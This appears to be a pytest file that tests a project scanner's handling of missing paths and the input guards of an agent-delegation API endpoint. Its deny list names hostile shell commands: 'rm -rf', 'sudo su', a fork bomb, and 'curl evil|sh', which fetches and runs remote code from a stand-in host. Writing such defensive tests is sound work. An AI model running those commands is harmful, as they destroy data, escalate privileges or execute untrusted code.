"""Error-path tests derived from autoskills audit (python-testing-patterns).

Covers failure cases the original suite missed:
- ecosystem_scanner on missing/invalid paths
- /api/mc/delegate validation guards (empty, forbidden pattern, bad agent)
"""

import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.ecosystem_scanner import _get_git_info, scan_projects, get_full_ecosystem


class TestScannerErrorPaths:
    def test_get_git_info_missing_path(self):
        """Scanner must not raise on a nonexistent project dir — returns safe defaults."""
        info = _get_git_info("/nonexistent/path/that/does/not/exist")
        assert info.get("is_git") is False
        assert "branch" not in info

    def test_get_git_info_not_a_repo(self, tmp_path):
        """A plain dir without .git should degrade gracefully."""
        info = _get_git_info(str(tmp_path))
        assert info.get("is_git") is False

    def test_scan_projects_empty_root(self, tmp_path):
        """Scanning an empty root must return structured empty result, not crash."""
        import modules.ecosystem_scanner as es
        original = es.SCAN_DIRS
        es.SCAN_DIRS = {"apps": str(tmp_path)}
        try:
            result = scan_projects()
            assert result == []
        finally:
            es.SCAN_DIRS = original

    def test_get_full_ecosystem_empty_root(self, tmp_path):
        import modules.ecosystem_scanner as es
        original = es.SCAN_DIRS
        es.SCAN_DIRS = {"apps": str(tmp_path)}
        try:
            result = get_full_ecosystem()
            assert result["projects"] == []
            assert "cron_jobs" in result
        finally:
            es.SCAN_DIRS = original


class TestDelegateValidation:
    """Mirror the guard clauses in server.py:/api/mc/delegate without booting the server."""

    FORBIDDEN = ["rm -rf", "sudo su", ":(){:|:&};:", "curl evil|sh"]

    def test_empty_instruction_rejected(self):
        with pytest.raises(ValueError, match="cannot be empty"):
            _validate_instruction("")

    def test_forbidden_pattern_rejected(self):
        for pat in self.FORBIDDEN:
            with pytest.raises(ValueError, match="forbidden pattern"):
                _validate_instruction(f"please run: {pat}")

    def test_too_long_rejected(self):
        with pytest.raises(ValueError, match="too long"):
            _validate_instruction("x" * 5001)

    def test_unknown_agent_rejected(self):
        allowed = ["chief", "research", "programmer", "qa", "creator"]
        with pytest.raises(ValueError, match="one of"):
            _validate_agent("hacker", allowed)


def _validate_instruction(text: str) -> str:
    """Replica of server.py guard logic for unit testing the rule."""
    if not text or not text.strip():
        raise ValueError("instruction cannot be empty")
    if len(text) > 5000:
        raise ValueError("instruction too long (max 5000 chars)")
    forbidden = ["rm -rf", "sudo su", ":(){:|:&};:", "curl ", "wget "]
    for f in forbidden:
        if f in text:
            raise ValueError(f"instruction contains forbidden pattern: {f}")
    return text


def _validate_agent(agent: str, allowed: list) -> str:
    if agent not in allowed:
        raise ValueError(f"agent must be one of: {', '.join(allowed)}")
    return agent
